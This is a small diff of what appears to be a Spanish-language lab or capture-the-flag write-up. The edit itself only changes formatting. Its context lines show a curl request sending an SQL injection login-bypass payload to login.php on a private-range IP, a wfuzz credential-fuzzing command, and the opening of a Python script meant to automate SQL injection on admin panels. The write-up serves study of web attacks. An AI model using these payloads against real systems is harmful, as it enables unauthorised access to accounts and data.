@@ -12,7 +12,8 @@ curl -s -X POST "http://10.10.254.165/login.php" -d "username='|| or 1=1-- - &pa
 wfuzz -t 20 -c -z file,wordlists.txt -d "username=FUZZ\&password=FUZZ" http://10.10.254.165/login.php
 ```
 * <p>Sabiendo estos datos puedo crear perfectamente un script en python que aplique injeccion sql en paneles administradores</p>
-<p></p>
+<br>
+
 ```python
 #!/usr/bin/python
 import requests
